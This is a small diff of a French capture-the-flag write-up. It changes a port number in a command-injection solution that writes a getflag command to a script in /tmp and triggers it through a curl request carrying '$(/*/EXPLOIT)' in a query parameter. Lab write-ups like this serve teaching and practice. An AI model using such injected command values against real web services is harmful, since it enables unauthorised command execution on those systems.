@@ -17,6 +17,6 @@ On contourne la contrainte des majuscules en passant par un script externe.
 $ echo 'getflag > /tmp/flag12' > /tmp/EXPLOIT
 $ chmod +x /tmp/EXPLOIT
 
-$ curl 'localhost:4747?x=$(/*/EXPLOIT)'
+$ curl 'localhost:4646?x=$(/*/EXPLOIT)'
 $ cat /tmp/flag12
 ```
